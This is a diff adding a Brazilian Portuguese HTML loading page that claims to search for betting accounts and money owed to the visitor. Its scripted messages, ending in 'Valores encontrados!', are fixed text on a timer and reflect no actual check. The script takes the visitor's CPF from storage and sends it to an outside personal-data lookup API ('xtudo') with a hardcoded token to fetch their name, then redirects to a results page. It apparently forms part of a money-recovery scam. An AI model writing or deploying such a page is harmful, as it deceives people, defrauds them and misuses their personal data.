@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Consultando Informações...</title>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      background-color: #ffffff;
+      margin: 0;
+      padding: 20px 12px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      color: #1155cc;
+      box-sizing: border-box;
+    }
+
+    .card {
+      background: transparent;
+      border: none;
+      box-shadow: none;
+      max-width: 480px;
+      width: 100%;
+      min-height: calc(100vh - 40px);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 30px 24px;
+      box-sizing: border-box;
+    }
+
+    .spinner {
+      width: 45px;
+      height: 45px;
+      border: 4px solid rgba(17, 85, 204, 0.2);
+      border-top: 4px solid #1155cc;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      font-size: 17px;
+      font-weight: 700;
+      text-align: center;
+      padding: 0 20px;
+      transition: opacity 0.3s ease;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="spinner"></div>
+    <div class="loading-text" id="loadingText">Consultando suas informações...</div>
+  </div>
+
+  <script>
+    const cpf = localStorage.getItem('recupera_cpf');
+    const texts = [
+      "Consultando suas informações...",
+      "Consultando contas onde você tem bet...",
+      "Consultando valores a receber...",
+      "Valores encontrados!"
+    ];
+
+    let currentIndex = 0;
+    let animacaoPronta = false;
+    let nomePronto = false;
+    const textElement = document.getElementById('loadingText');
+
+    // Função que redireciona somente quando AMBOS estiverem prontos
+    function tentarRedirecionar() {
+      if (animacaoPronta && nomePronto) {
+        window.location.href = 'resultado.html';
+      }
+    }
+
+    // Animação dos textos (roda em paralelo com a API)
+    const interval = setInterval(() => {
+      currentIndex++;
+      if (currentIndex < texts.length) {
+        textElement.style.opacity = '0';
+        setTimeout(() => {
+          textElement.textContent = texts[currentIndex];
+          textElement.style.opacity = '1';
+        }, 300);
+      } else {
+        clearInterval(interval);
+        animacaoPronta = true;
+        tentarRedirecionar();
+      }
+    }, 2000);
+
+    // Busca o nome na API em paralelo
+    async function buscarNome() {
+      if (!cpf) {
+        nomePronto = true;
+        tentarRedirecionar();
+        return;
+      }
+
+      // Extrai nome do JSON da API Xtudo
+      function extrairNome(data) {
+        if (!data || !data.resultados) return null;
+        for (const item of data.resultados) {
+          if (item && !Array.isArray(item) && item.NOME && typeof item.NOME === 'string') return item.NOME;
+          if (item && !Array.isArray(item) && item.nome && typeof item.nome === 'string') return item.nome;
+          if (Array.isArray(item)) {
+            for (const sub of item) {
+              if (sub && sub.NOME && typeof sub.NOME === 'string') return sub.NOME;
+              if (sub && sub.nome && typeof sub.nome === 'string') return sub.nome;
+            }
+          }
+        }
+        return null;
+      }
+
+      let nome = null;
+
+      // Tenta API proxy (funciona local e na Netlify)
+      const endpoints = [
+        `/api/consulta-cpf?cpf=${encodeURIComponent(cpf)}`,
+        `/.netlify/functions/consulta-cpf?cpf=${encodeURIComponent(cpf)}`,
+        `/.netlify/functions/api/consulta-cpf?cpf=${encodeURIComponent(cpf)}`
+      ];
+
+      for (const ep of endpoints) {
+        if (nome) break;
+        try {
+          const r = await Promise.race([
+            fetch(ep),
+            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 4000))
+          ]);
+          if (r.ok) {
+            const d = await r.json();
+            if (d && d.success && d.nome) {
+              nome = d.nome;
+              break;
+            }
+          }
+        } catch(e) {}
+      }
+
+      // Fallback: API Xtudo direto no browser
+      if (!nome) {
+        try {
+          const r2 = await Promise.race([
+            fetch(`https://base4.sistemafullativo.online:81/api/xtudo?CPF=${cpf}&token=15FFEA2609`),
+            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 25000))
+          ]);
+          const d2 = await r2.json();
+          nome = extrairNome(d2);
+        } catch(e) { /* API indisponível */ }
+      }
+
+      // Salva no localStorage (resultado.html vai ler daqui)
+      if (nome) {
+        localStorage.setItem('recupera_nome', nome);
+      } else {
+        localStorage.removeItem('recupera_nome');
+      }
+
+      nomePronto = true;
+      tentarRedirecionar();
+    }
+
+    buscarNome();
+  </script>
+</body>
+</html>
